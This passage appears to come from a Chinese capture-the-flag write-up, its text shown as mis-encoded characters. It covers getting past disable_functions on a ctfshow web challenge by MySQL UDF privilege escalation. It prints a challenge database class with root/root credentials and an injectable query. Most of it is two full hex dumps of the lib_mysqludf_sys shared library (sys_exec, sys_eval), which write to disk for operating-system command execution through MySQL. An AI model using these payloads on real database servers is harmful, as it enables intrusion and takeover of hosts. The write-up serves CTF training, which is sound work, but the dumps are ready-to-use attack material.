<p>getshell ä½†å‘ç°æŠŠå‘½ä»¤æ‰§è¡Œå‡½æ•°éƒ½éƒ½ç¦ç”¨äº†ï¼Œæ²¡èƒ½ç»•è¿‡disable_function,</p>
<p>æŸ¥çœ‹è¿™ä¸ªæ–‡ä»¶å‘ç°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system36d/util/dbutil.php</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“ä¿¡æ¯</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">db</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$host</span>=<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$username</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$password</span>=<span class="string">&#x27;root&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$database</span>=<span class="string">&#x27;ctfshow&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="variable">$conn</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select `key` from ctfshow_keys&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_username</span>(<span class="params"><span class="variable">$id</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$conn</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">get_conn</span>();</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select `username` from ctfshow_users where id = (<span class="subst">$id</span>)&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">            <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_ASSOC);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="built_in">self</span>::<span class="title function_ invoke__">close</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">get_conn</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="built_in">self</span>::<span class="variable">$host</span>, <span class="built_in">self</span>::<span class="variable">$username</span>, <span class="built_in">self</span>::<span class="variable">$password</span>, <span class="built_in">self</span>::<span class="variable">$database</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">self</span>::<span class="variable">$conn</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">self</span>::<span class="variable">$conn</span>!==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="built_in">self</span>::<span class="variable">$conn</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ•°æ®åº“è¿æ¥</p>
<h2 id="udfææƒ"><a href="#udfææƒ" class="headerlink" title="udfææƒ"></a>udfææƒ</h2><p>åœ¨sqlmap é‡Œæœ‰udfææƒçš„æ–‡ä»¶ï¼Œä¸åŒçš„SQLmap ,ä½ç½®å¯èƒ½ä¸ä¸€æ ·</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">usr/share/sqlmap/data/udf/mysql/linux/64/lib_mysqludf_sys.so_</span><br></pre></td></tr></table></figure>

<p>ç”±äºåŠ å¯†è¿‡ï¼Œéœ€è¦ç”¨sqlmap,é‡Œçš„cloak.py -d -i è¿›è¡Œè§£å¯†ï¼Œè§£å¯†åä¼šåœ¨ç›¸åŒæ–‡ä»¶ä¸‹ç”Ÿæˆ</p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203117.png"></p>
<p><img src="/2023/05/29/ctfshow%E5%90%88%E9%9B%86-ctfshow%E7%BB%88%E6%9E%81%E8%80%83%E6%A0%B8/QQ%E6%88%AA%E5%9B%BE20230530203252.png"></p>
<p>lib_mysqludf_sys.so,ä¸ºç”Ÿæˆçš„è§£å¯†åï¼Œå†å°†è¿™ä¸ª010æ‰“å¼€ï¼Œè½¬ä¸º16è¿›åˆ¶ï¼Œå»æ‰æ¢è¡Œï¼Œç©ºæ ¼</p>
<p>ç”Ÿæˆæ–‡æœ¬ï¼Œä¼ å…¥ä¸‹é¢ï¼Œç”±äºè¿‡ç¨‹æ¯”è¾ƒå¤æ‚ï¼Œæ‰€ä»¥ï¼Œç›´æ¥æ‹¿åˆ«äººç”Ÿæˆå¥½çš„ç”¨ï¼Œ</p>
<p>æ¨èä¸¤ä¸ªç½‘ç«™so,ä¸º16è¿›åˆ¶</p>
<p><a href="https://www.sqlsec.com/tools/udf.html">MySQL UDF ææƒåå…­è¿›åˆ¶æŸ¥è¯¢ | å›½å…‰ (sqlsec.com)</a></p>
<p><a href="https://www.isisy.com/1248.html">UDFæ–‡ä»¶åå…­è¿›åˆ¶ç¼–ç  - Is Yangâ€™s Blog (isisy.com)</a></p>
<p>é€‚ç”¨äº<strong>64ä½Linuxæ“ä½œç³»ç»Ÿ</strong>UDFæ–‡ä»¶åå…­è¿›åˆ¶ç¼–ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7f454c4602010100000000000000000003003e0001000000d00c0000000000004000000000000000e8180000000000000000000040003800050040001a00190001000000050000000000000000000000000000000000000000000000000000001415000000000000141500000000000000002000000000000100000006000000181500000000000018152000000000001815200000000000700200000000000080020000000000000000200000000000020000000600000040150000000000004015200000000000401520000000000090010000000000009001000000000000080000000000000050e57464040000006412000000000000641200000000000064120000000000009c000000000000009c00000000000000040000000000000051e5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000250000002b0000001500000005000000280000001e000000000000000000000006000000000000000c00000000000000070000002a00000009000000210000000000000000000000270000000b0000002200000018000000240000000e00000000000000040000001d0000001600000000000000130000000000000000000000120000002300000010000000250000001a0000000f000000000000000000000000000000000000001b00000000000000030000000000000000000000000000000000000000000000000000002900000014000000000000001900000020000000000000000a00000011000000000000000000000000000000000000000d0000002600000017000000000000000800000000000000000000000000000000000000000000001f0000001c0000000000000000000000000000000000000000000000020000000000000011000000140000000200000007000000800803499119c4c93da4400398046883140000001600000017000000190000001b0000001d0000002000000022000000000000002300000000000000240000002500000027000000290000002a00000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe120000000000000000000000000000000000000000000000000000000003000900a00b0000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000e0000000120000000000000000000000de01000000000000790100001200000000000000000000007700000000000000ba0000001200000000000000000000003504000000000000f5000000120000000000000000000000c2010000000000009e010000120000000000000000000000d900000000000000fb000000120000000000000000000000050000000000000016000000220000000000000000000000fe00000000000000cf000000120000000000000000000000ad00000000000000880100001200000000000000000000008000000000000000ab010000120000000000000000000000250100000000000010010000120000000000000000000000dc00000000000000c7000000120000000000000000000000c200000000000000b5000000120000000000000000000000cc02000000000000ed000000120000000000000000000000e802000000000000e70000001200000000000000000000009b00000000000000c200000012000000000000000000000028000000000000008001000012000b007a100000000000006e000000000000007500000012000b00a70d00000000000001000000000000001000000012000c00781100000000000000000000000000003f01000012000b001a100000000000002d000000000000001f01000012000900a00b0000000000000000000000000000c30100001000f1ff881720000000000000000000000000009600000012000b00ab0d00000000000001000000000000007001000012000b0066100000000000001400000000000000cf0100001000f1ff981720000000000000000000000000005600000012000b00a50d00000000000001000000000000000201000012000b002e0f0000000000002900000000000000a301000012000b00f71000000000000041000000000000003900000012000b00a40d00000000000001000000000000003201000012000b00ea0f0000000000003000000000000000bc0100001000f1ff881720000000000000000000000000006500000012000b00a60d00000000000001000000000000002501000012000b00800f0000000000006a000000000000008500000012000b00a80d00000000000003000000000000001701000012000b00570f00000000000029000000000000005501000012000b0047100000000000001f00000000000000a900000012000b00ac0d0000000000009a000000000000008f01000012000b00e8100000000000000f00000000000000d700000012000b00460e000000000000e800000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e322e35000000000000000000020002000200020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100000001000100b20100001000000000000000751a690900000200d401000000000000801720000000000008000000000000008017200000000000d01620000000000006000000020000000000000000000000d81620000000000006000000030000000000000000000000e016200000000000060000000a00000000000000000000000017200000000000070000000400000000000000000000000817200000000000070000000500000000000000000000001017200000000000070000000600000000000000000000001817200000000000070000000700000000000000000000002017200000000000070000000800000000000000000000002817200000000000070000000900000000000000000000003017200000000000070000000a00000000000000000000003817200000000000070000000b00000000000000000000004017200000000000070000000c00000000000000000000004817200000000000070000000d00000000000000000000005017200000000000070000000e00000000000000000000005817200000000000070000000f00000000000000000000006017200000000000070000001000000000000000000000006817200000000000070000001100000000000000000000007017200000000000070000001200000000000000000000007817200000000000070000001300000000000000000000004883ec08e827010000e8c2010000e88d0500004883c408c3ff35320b2000ff25340b20000f1f4000ff25320b20006800000000e9e0ffffffff252a0b20006801000000e9d0ffffffff25220b20006802000000e9c0ffffffff251a0b20006803000000e9b0ffffffff25120b20006804000000e9a0ffffffff250a0b20006805000000e990ffffffff25020b20006806000000e980ffffffff25fa0a20006807000000e970ffffffff25f20a20006808000000e960ffffffff25ea0a20006809000000e950ffffffff25e20a2000680a000000e940ffffffff25da0a2000680b000000e930ffffffff25d20a2000680c000000e920ffffffff25ca0a2000680d000000e910ffffffff25c20a2000680e000000e900ffffffff25ba0a2000680f000000e9f0feffff00000000000000004883ec08488b05f50920004885c07402ffd04883c408c390909090909090909055803d900a2000004889e5415453756248833dd809200000740c488b3d6f0a2000e812ffffff488d05130820004c8d2504082000488b15650a20004c29e048c1f803488d58ff4839da73200f1f440000488d4201488905450a200041ff14c4488b153a0a20004839da72e5c605260a2000015b415cc9c3660f1f8400000000005548833dbf072000004889e57422488b05530920004885c07416488d3da70720004989c3c941ffe30f1f840000000000c9c39090c3c3c3c331c0c3c341544883c9ff4989f455534883ec10488b4610488b3831c0f2ae48f7d1488d69ffe8b6feffff83f80089c77c61754fbf1e000000e803feffff488d70ff4531c94531c031ffb921000000ba07000000488d042e48f7d64821c6e8aefeffff4883f8ff4889c37427498b4424104889ea4889df488b30e852feffffffd3eb0cba0100000031f6e802feffff31c0eb05b8010000005a595b5d415cc34157bf00040000415641554531ed415455534889f34883ec1848894c24104c89442408e85afdffffbf010000004989c6e84dfdffffc600004889c5488b4310488d356a030000488b38e814feffff4989c7eb374c89f731c04883c9fff2ae4889ef48f7d1488d59ff4d8d641d004c89e6e8ddfdffff4a8d3c284889da4c89f64d89e54889c5e8a8fdffff4c89fabe080000004c89f7e818fdffff4885c075b44c89ffe82bfdffff807d0000750a488b442408c60001eb1f42c6442dff0031c04883c9ff4889eff2ae488b44241048f7d148ffc94889084883c4184889e85b5d415c415d415e415fc34883ec08833e014889d7750b488b460831d2833800740e488d353a020000e817fdffffb20188d05ec34883ec08833e014889d7750b488b460831d2833800740e488d3511020000e8eefcffffb20188d05fc3554889fd534889d34883ec08833e027409488d3519020000eb3f488b46088338007409488d3526020000eb2dc7400400000000488b4618488b384883c70248037808e801fcffff31d24885c0488945107511488d351f0200004889dfe887fcffffb20141585b88d05dc34883ec08833e014889f94889d77510488b46088338007507c6010131c0eb0e488d3576010000e853fcffffb0014159c34154488d35ef0100004989cc4889d7534889d34883ec08e832fcffff49c704241e0000004889d8415a5b415cc34883ec0831c0833e004889d7740e488d35d5010000e807fcffffb001415bc34883ec08488b4610488b38e862fbffff5a4898c34883ec28488b46184c8b4f104989f2488b08488b46104c89cf488b004d8d4409014889c6f3a44c89c7498b4218488b0041c6040100498b4210498b5218488b4008488b4a08ba010000004889c6f3a44c89c64c89cf498b4218488b400841c6040000e867fbffff4883c4284898c3488b7f104885ff7405e912fbffffc3554889cd534c89c34883ec08488b4610488b38e849fbffff4885c04889c27505c60301eb1531c04883c9ff4889d7f2ae48f7d148ffc948894d00595b4889d05dc39090909090909090554889e5534883ec08488b05c80320004883f8ff7419488d1dbb0320000f1f004883eb08ffd0488b034883f8ff75f14883c4085bc9c390904883ec08e86ffbffff4883c408c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000011b033b980000001200000040fbffffb400000041fbffffcc00000042fbffffe400000043fbfffffc00000044fbffff1401000047fbffff2c01000048fbffff44010000e2fbffff6c010000cafcffffa4010000f3fcffffbc0100001cfdffffd401000086fdfffff4010000b6fdffff0c020000e3fdffff2c02000002feffff4402000016feffff5c02000084feffff7402000093feffff8c0200001400000000000000017a5200017810011b0c070890010000140000001c00000084faffff01000000000000000000000014000000340000006dfaffff010000000000000000000000140000004c00000056faffff01000000000000000000000014000000640000003ffaffff010000000000000000000000140000007c00000028faffff030000000000000000000000140000009400000013faffff01000000000000000000000024000000ac000000fcf9ffff9a00000000420e108c02480e18410e20440e3083048603000000000034000000d40000006efaffffe800000000420e10470e18420e208d048e038f02450e28410e30410e38830786068c05470e50000000000000140000000c0100001efbffff2900000000440e100000000014000000240100002ffbffff2900000000440e10000000001c0000003c01000040fbffff6a00000000410e108602440e188303470e200000140000005c0100008afbffff3000000000440e10000000001c00000074010000a2fbffff2d00000000420e108c024e0e188303470e2000001400000094010000affbffff1f00000000440e100000000014000000ac010000b6fbffff1400000000440e100000000014000000c4010000b2fbffff6e00000000440e300000000014000000dc01000008fcffff0f00000000000000000000001c000000f4010000fffbffff4100000000410e108602440e188303470e2000000000000000000000ffffffffffffffff0000000000000000ffffffffffffffff000000000000000000000000000000000100000000000000b2010000000000000c00000000000000a00b0000000000000d00000000000000781100000000000004000000000000005801000000000000f5feff6f00000000a00200000000000005000000000000006807000000000000060000000000000060030000000000000a00000000000000e0010000000000000b0000000000000018000000000000000300000000000000e81620000000000002000000000000008001000000000000140000000000000007000000000000001700000000000000200a0000000000000700000000000000c0090000000000000800000000000000600000000000000009000000000000001800000000000000feffff6f00000000a009000000000000ffffff6f000000000100000000000000f0ffff6f000000004809000000000000f9ffff6f0000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000401520000000000000000000000000000000000000000000ce0b000000000000de0b000000000000ee0b000000000000fe0b0000000000000e0c0000000000001e0c0000000000002e0c0000000000003e0c0000000000004e0c0000000000005e0c0000000000006e0c0000000000007e0c0000000000008e0c0000000000009e0c000000000000ae0c000000000000be0c0000000000008017200000000000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e7368737472746162002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e63746f7273002e64746f7273002e6a6372002e64796e616d6963002e676f74002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0000000500000002000000000000005801000000000000580100000000000048010000000000000300000000000000080000000000000004000000000000000b000000f6ffff6f0200000000000000a002000000000000a002000000000000c000000000000000030000000000000008000000000000000000000000000000150000000b00000002000000000000006003000000000000600300000000000008040000000000000400000002000000080000000000000018000000000000001d00000003000000020000000000000068070000000000006807000000000000e00100000000000000000000000000000100000000000000000000000000000025000000ffffff6f020000000000000048090000000000004809000000000000560000000000000003000000000000000200000000000000020000000000000032000000feffff6f0200000000000000a009000000000000a009000000000000200000000000000004000000010000000800000000000000000000000000000041000000040000000200000000000000c009000000000000c00900000000000060000000000000000300000000000000080000000000000018000000000000004b000000040000000200000000000000200a000000000000200a0000000000008001000000000000030000000a0000000800000000000000180000000000000055000000010000000600000000000000a00b000000000000a00b000000000000180000000000000000000000000000000400000000000000000000000000000050000000010000000600000000000000b80b000000000000b80b00000000000010010000000000000000000000000000040000000000000010000000000000005b000000010000000600000000000000d00c000000000000d00c000000000000a80400000000000000000000000000001000000000000000000000000000000061000000010000000600000000000000781100000000000078110000000000000e000000000000000000000000000000040000000000000000000000000000006700000001000000320000000000000086110000000000008611000000000000dd000000000000000000000000000000010000000000000001000000000000006f000000010000000200000000000000641200000000000064120000000000009c000000000000000000000000000000040000000000000000000000000000007d000000010000000200000000000000001300000000000000130000000000001402000000000000000000000000000008000000000000000000000000000000870000000100000003000000000000001815200000000000181500000000000010000000000000000000000000000000080000000000000000000000000000008e000000010000000300000000000000281520000000000028150000000000001000000000000000000000000000000008000000000000000000000000000000950000000100000003000000000000003815200000000000381500000000000008000000000000000000000000000000080000000000000000000000000000009a000000060000000300000000000000401520000000000040150000000000009001000000000000040000000000000008000000000000001000000000000000a3000000010000000300000000000000d016200000000000d0160000000000001800000000000000000000000000000008000000000000000800000000000000a8000000010000000300000000000000e816200000000000e8160000000000009800000000000000000000000000000008000000000000000800000000000000b1000000010000000300000000000000801720000000000080170000000000000800000000000000000000000000000008000000000000000000000000000000b7000000080000000300000000000000881720000000000088170000000000001000000000000000000000000000000008000000000000000000000000000000bc000000010000000000000000000000000000000000000088170000000000009b000000000000000000000000000000010000000000000000000000000000000100000003000000000000000000000000000000000000002318000000000000c500000000000000000000000000000001000000000000000000000000000000</span><br></pre></td></tr></table></figure>

<p>é€‚ç”¨äº<strong>32ä½Linuxæ“ä½œç³»ç»Ÿ</strong>UDFæ–‡ä»¶åå…­è¿›åˆ¶ç¼–ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7f454c4601010100000000000000000003000300010000007009000034000000581200000000000034002000040028001900180001000000000000000000000000000000f80e0000f80e00000500000000100000010000000010000000100000001000000801000010010000060000000010000002000000141000001410000014100000d0000000d0000000060000000400000051e5746400000000000000000000000000000000000000000600000004000000250000002a0000001400000008000000270000001d0000000000000000000000030000000000000011000000000000000a0000002900000012000000200000000000000000000000260000000c0000002100000017000000230000000d000000000000000e0000001c000000150000000000000006000000000000000000000010000000220000000f0000002400000019000000180000000000000000000000000000000000000000000000000000001a0000000200000013000000050000000000000000000000000000000000000000000000000000001f00000001000000280000000000000000000000000000000000000000000000070000002500000016000000000000000b00000000000000000000000000000000000000000000001e0000001b0000000000000000000000090000000000000000000000040000000000000011000000130000000400000007000000010804409019c7c9bda4080390046083130000001500000016000000180000001a0000001c0000001f00000021000000000000002200000000000000230000002400000026000000280000002900000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed871581cc1e2f7dea868be12bbe3927c7e8b92cd1e7066a9c3f9bfba745bb073371974ec4345d5ecc5a62c1cc3138aff36ac68ae3b9fd4a0ac73d1c525681b320b5911feab5fbe1200000000000000000000000000000000e7000000000000008d00000012000000c2000000000000005c00000012000000ba00000000000000e7040000120000000100000000000000000000002000000025000000000000000000000020000000ed000000000000007e02000012000000ab01000000000000150100001200000079010000000000007d00000012000000c700000000000000c600000012000000f50000000000000071010000120000009e01000000000000fb00000012000000cf00000000000000700000001200000010010000000000002500000012000000e0000000000000008901000012000000b500000000000000a80200001200000016000000000000000b0100002200000088010000000000007400000012000000fb00000000000000230000001200000080010000040d00006100000012000b00750000003b0a00000500000012000b0010000000f80d00000000000012000c003f010000a10c00002500000012000b001f010000100900000000000012000900c301000008110000000000001000f1ff96000000470a00000500000012000b0070010000ee0c00001600000012000b00cf01000010110000000000001000f1ff56000000310a00000500000012000b00020100009c0b00003000000012000b00a30100007d0d00003e00000012000b00390000002c0a00000500000012000b00320100006b0c00003600000012000b00bc01000008110000000000001000f1ff65000000360a00000500000012000b0025010000fc0b00006f00000012000b0085000000400a00000700000012000b0017010000cc0b00003000000012000b0055010000c60c00002800000012000b00a90000004c0a00008800000012000b008f010000650d00001800000012000b00d7000000d40a0000c800000012000b00005f5f676d6f6e5f73746172745f5f005f66696e69005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c6173736573006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974007379735f6765745f6465696e6974007379735f657865635f6465696e6974007379735f6576616c5f6465696e6974007379735f62696e6576616c5f696e6974007379735f62696e6576616c5f6465696e6974007379735f62696e6576616c00666f726b00737973636f6e66006d6d6170007374726e6370790077616974706964007379735f6576616c006d616c6c6f6300706f70656e007265616c6c6f630066676574730070636c6f7365007379735f6576616c5f696e697400737472637079007379735f657865635f696e6974007379735f7365745f696e6974007379735f6765745f696e6974006c69625f6d7973716c7564665f7379735f696e666f006c69625f6d7973716c7564665f7379735f696e666f5f696e6974007379735f657865630073797374656d007379735f73657400736574656e76007379735f7365745f6465696e69740066726565007379735f67657400676574656e76006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e312e3300474c4942435f322e3000474c4942435f322e310000000200030003000000000003000300030003000300030003000300030003000400030002000100010001000100010001000100010001000100010001000100010001000100010001000100010001000100010001000300b20100001000000000000000731f690900000400d4010000100000001069690d00000300e0010000100000001169690d00000200ea01000000000000040b000008000000b70b000008000000e70b000008000000110c000008000000220c000008000000550c0000080000008e0c000008000000ac0c000008000000d90c00000800000004110000080000006b0a0000020f00007c0a000002030000960a000002020000ad0a000002090000430b000002090000bc0a0000020c0000e40a0000020e0000f30a0000020e00003f0c0000020e00000e0b000002010000310b000002060000560b0000020a0000680b000002120000bf0b0000020d0000ef0b0000020d00005b0c0000020d0000960c0000020d0000b20c0000020d0000e10c0000020d0000fd0c000002080000580d000002110000770d0000020b00008e0d000002070000e410000006040000e810000006050000ec10000006100000fc1000000704000000110000071000005589e55383ec04e8000000005b81c3d40700008b93f4ffffff85d27405e81e000000e8b9000000e884040000585bc9c3ffb304000000ffa30800000000000000ffa30c0000006800000000e9e0ffffffffa3100000006808000000e9d0ffffff5589e55653e8ad00000081c37607000083ec1080bb1800000000755d8b83fcffffff85c0740e8b8314000000890424e8bcffffff8b8b1c0000008d831cffffff8d9318ffffff29d0c1f8028d70ff39f173208db6000000008d410189831c000000ff948318ffffff8b8b1c00000039f172e6c683180000000183c4105b5e5dc35589e553e82e00000081c3f706000083ec048b9320ffffff85d274158b93f8ffffff85d2740b8d8320ffffff890424ffd283c4045b5dc38b1c24c3905589e55dc35589e55dc35589e55dc35589e55dc35531c089e55dc35589e55dc35589e557565383ec0cfc83c9ff8b750c8b46088b3831c0f2aef7d18d59ffe8fcffffff83f8007c53753f83ec0c6a1ee8fcffffff5f596a006a00486a218d1418f7d06a0721d0506a00e8fcffffff83c42083f8ff89c7742351538b4608ff3057e8fcffffffffd7eb0b526a016a0050e8fcffffff31c083c410eb05b8010000008d65f45b5e5f5dc35589e557565383ec18fc6800040000e8fcffffffc70424010000008945e8e8fcffffffc6000089c68b450c595b31db68840e00008b4008ff30e8fcffffff8945eceb338b7de831c083c9fff2ae5252f7d18d79ff8d043b50568945f0e8fcffffff83c40c57ff75e889c68d041850e8fcffffff8b5df083c40cff75ec6a04ff75e8e8fcffffff83c41085c075b683ec0cff75ece8fcffffff83c410803e0075088b4518c60001eb16c6441eff0031c083c9ff89f7f2ae8b4514f7d14989088d65f489f05b5e5f5dc35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec088b450c833801750a8b400431d28338007414505068140e0000ff7510e8fcffffffb20183c41088d0c9c35589e55383ec048b550c8b5d10833a0274095050683f0e0000eb428b420483380074095050685e0e0000eb318b520c83ec0cc74004000000008b0283c00203420450e8fcffffff8b550883c41089420c31d285c07512505068860e000053e8fcffffffb20183c41088d08b5dfcc9c35589e583ec088b450c83380175128b4004833800750a8b4508c6000131c0eb14505068140e0000ff7510e8fcffffffb00183c410c9c35589e55383ec0c8b5d1068a00e000053e8fcffffff8b4514c7001e00000089d88b5dfcc9c35531d289e583ec088b450c8338007414525268bf0e0000ff7510e8fcffffffb20183c41088d0c9c35589e583ec148b450c8b4008ff30e8fcffffffc999c35589e557565383ec10fc8b550c8b45088b580c8b420c89df8b088d440b018945e88b42088b30f3a48b420c8b00c60403008b42088b4a0c8b7de88b70048b4904f3a48b420c8b55e88b4004c60402006a015253e8fcffffff8d65f45b5e5f5d99c35589e58b45088b400c85c074098945085de9fcffffff5dc35589e55783ec10fc8b450c8b4008ff30e8fcffffff83c41085c089c275088b4518c60001eb1131c083c9ff89d7f2ae8b4514f7d149890889d08b7dfcc9c390909090905589e55653e85dfcffff81c3260300008b8310ffffff83f8ff74198db310ffffff8db4260000000083ee04ffd08b0683f8ff75f45b5e5dc35589e55383ec04e8000000005b81c3ec020000e860fbffff595bc9c345787065637465642065786163746c79206f6e6520737472696e67207479706520706172616d657465720045787065637465642065786163746c792074776f20617267756d656e747300457870656374656420737472696e67207479706520666f72206e616d6520706172616d6574657200436f756c64206e6f7420616c6c6f63617465206d656d6f7279006c69625f6d7973716c7564665f7379732076657273696f6e20302e302e34004e6f20617267756d656e747320616c6c6f77656420287564663a206c69625f6d7973716c7564665f7379735f696e666f290000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000ffffffff00000000ffffffff000000000000000001000000b20100000c000000100900000d000000f80d000004000000b4000000f5feff6ff8010000050000005805000006000000b80200000a000000f40100000b0000001000000003000000f010000002000000100000001400000011000000170000000009000011000000e0070000120000002001000013000000080000001600000000000000feffff6fa0070000ffffff6f01000000f0ffff6f4c070000faffff6f0a00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000141000000000000000000000560900006609000004110000004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200004743433a202844656269616e20342e332e322d312e312920342e332e3200002e73687374727